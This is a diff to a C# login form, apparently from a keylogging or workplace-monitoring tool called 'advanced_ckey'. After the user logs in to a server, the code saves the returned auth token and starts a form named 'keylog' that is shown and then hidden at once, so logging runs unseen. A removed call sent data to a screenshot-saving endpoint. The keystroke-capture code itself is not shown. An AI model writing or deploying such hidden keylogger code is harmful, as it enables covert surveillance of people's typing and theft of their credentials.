@@ -18,7 +18,18 @@ namespace advanced_ckey
     {
         public Formlog()
         {
+            // don't show if already logged in
+        //    MessageBox.Show( Properties.Settings.Default.auth_token );
+            if( Properties.Settings.Default.auth_token != String.Empty )
+            {
+
+            //    this.initTimer();
+            //    this.startLogging();
+            //    return;
+            }
+            //  What do you think you are doing?
             InitializeComponent();
+
         }
 
         public const int WM_NCLBUTTONDOWN = 0xA1;
@@ -67,24 +78,29 @@ namespace advanced_ckey
                     string jsonResponse = wc.UploadString(URI, myParameters);  
                 //    MessageBox.Show( jsonResponse ); 
                     dynamic result = JsonValue.Parse( jsonResponse );
-                //    MessageBox.Show( result.badnews ); 
-                //    MessageBox.Show( result["auth_token"] ); 
 
-                    string URIX = "https://" + txtweb.Text + "/widgets/Workplace_Screenshot_Save?pc_widget_output_method=JSON&";
-                    string myParametersX = "user_id=" + result["user_id"] + "&auth_token=" + result["auth_token"];
-                     //   MessageBox.Show( myParametersX ); 
-
-                    using (WebClient wcX = new WebClient())
+                    try
                     {
-                        wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-                        string jsonResponseX = wc.UploadString(URIX, myParametersX);  
-                    //    MessageBox.Show( jsonResponseX ); 
-                        dynamic resultX = JsonValue.Parse( jsonResponseX );
-                        MessageBox.Show( resultX["goodnews"] ); 
+                        if( result["user_id"] != "" )
+                        {
+                        //    MessageBox.Show( "Login Successful..." );
+                            Properties.Settings.Default.auth_token = result["auth_token"];
+                            Properties.Settings.Default.user_id = result["user_id"];
+                            this.Hide();
+                        //  this.Close();
+                            this.startLogging();
 
-                    //    MessageBox.Show( resultX["badnews"] ); 
+                        }
+                        else
+                        {
+                            
+                        }
+                    }                     
+                    catch (Exception)
+                    {
+                        MessageBox.Show( result["badnews"] );
+                        return;
                     }
-
 
                 }
 
@@ -96,18 +112,25 @@ namespace advanced_ckey
             }
 
 
+        //    this.Hide();
+        //    sign_in log = new sign_in();
+        //    log.ShowDialog();
+        //    this.Close(); 
 
-            this.Hide();
-            sign_in log = new sign_in();
-            log.ShowDialog();
-            this.Close();
+        }
 
+        private void startLogging()
+        {
+            Form1 keylog = new Form1();
+            keylog.Show();
+            keylog.Hide();
+            timer1.Stop();
         }
 
         private void Formlog_Load(object sender, EventArgs e)
         {
             startup();
-           Properties.Settings.Default.Reset(); 
+            Properties.Settings.Default.Reset(); 
 
             if (Properties.Settings.Default.username != string.Empty && Properties.Settings.Default.password != string.Empty)
             {
